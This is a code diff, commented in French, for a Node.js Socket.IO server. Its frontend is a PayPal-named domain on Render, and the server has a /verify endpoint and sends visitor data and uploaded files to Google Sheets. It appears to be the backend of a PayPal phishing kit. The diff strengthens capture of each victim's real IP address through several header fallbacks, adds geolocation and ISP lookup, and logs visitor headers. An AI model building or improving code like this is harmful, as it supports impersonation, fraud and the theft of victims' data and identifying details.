@@ -8,6 +8,9 @@ const cors = require('cors');
 const app = express();
 const server = http.createServer(app);
 
+// ✅ CORRECTION : Configuration pour les proxies (Render)
+app.set('trust proxy', true);
+
 // --- Configuration CORS ---
 const frontendURL = "https://paypal-owpo.onrender.com";
 app.use(cors({ origin: frontendURL }));
@@ -48,7 +51,7 @@ async function sendToGoogleSheets(data) {
     });
     
     if (!response.ok) {
-      console.error('Erreur envoi Google Sheets:', response.status, response.statusText);
+      console.error('❌ Erreur envoi Google Sheets:', response.status, response.statusText);
     } else {
       console.log('✅ Données envoyées vers Google Sheets:', data.type);
     }
@@ -79,17 +82,51 @@ app.post('/verify', (req, res) => {
 
 // --- Gestion des connexions Socket.IO ---
 io.on('connection', async (socket) => {
-  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+  // ✅ CORRECTION : Récupération IP réelle avec plusieurs méthodes de fallback
+  const getClientIP = (socket) => {
+    // Méthode 1 : Headers X-Forwarded-For (Render utilise ça)
+    const forwarded = socket.handshake.headers['x-forwarded-for'];
+    if (forwarded) {
+      // Prendre la première IP de la liste (client réel)
+      return forwarded.split(',')[0].trim();
+    }
+    
+    // Méthode 2 : X-Real-IP
+    const realIP = socket.handshake.headers['x-real-ip'];
+    if (realIP) {
+      return realIP;
+    }
+    
+    // Méthode 3 : Socket.IO handshake address
+    const handshakeIP = socket.handshake.address;
+    if (handshakeIP && handshakeIP !== '127.0.0.1' && handshakeIP !== '::1') {
+      return handshakeIP.replace('::ffff:', ''); // Nettoyer IPv6-mapped IPv4
+    }
+    
+    // Méthode 4 : Connection remote address
+    const remoteAddr = socket.conn.remoteAddress;
+    if (remoteAddr && remoteAddr !== '127.0.0.1' && remoteAddr !== '::1') {
+      return remoteAddr.replace('::ffff:', '');
+    }
+    
+    // Fallback
+    return 'IP non disponible';
+  };
+
+  const clientIp = getClientIP(socket);
   let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };
 
-  try {
+  // ✅ AMÉLIORATION : Vérifier si l'IP est valide avant géolocalisation
+  if (clientIp && clientIp !== 'IP non disponible' && clientIp !== '127.0.0.1') {
+    try {
       const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
       const geoData = await geoResponse.json();
       if (geoData.status === 'success') {
         geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
       }
-  } catch (error) { 
-    console.error("Erreur de géolocalisation:", error); 
+    } catch (error) { 
+      console.error("Erreur de géolocalisation:", error); 
+    }
   }
 
   const clientInfo = {
@@ -99,6 +136,18 @@ io.on('connection', async (socket) => {
     connectedAt: new Date().toISOString(),
     ...geoInfo
   };
+
+  // ✅ DEBUG : Log pour vérifier
+  console.log('🔍 Client connecté:', {
+    ip: clientIp,
+    headers: {
+      'x-forwarded-for': socket.handshake.headers['x-forwarded-for'],
+      'x-real-ip': socket.handshake.headers['x-real-ip'],
+      'user-agent': socket.handshake.headers['user-agent']?.substring(0, 50) + '...'
+    },
+    handshakeAddress: socket.handshake.address,
+    geoInfo: geoInfo
+  });
 
   const sessionId = generateSessionId(clientIp);
 
@@ -157,7 +206,7 @@ io.on('connection', async (socket) => {
     
     io.emit('file message', enhancedFileData);
     
-    // 📁 ENVOYER FICHIER vers Google Sheets (optionnel)
+    // 📁 ENVOYER FICHIER vers Google Sheets
     sendToGoogleSheets({
       type: 'file_upload',
       sessionId: socket.sessionId,
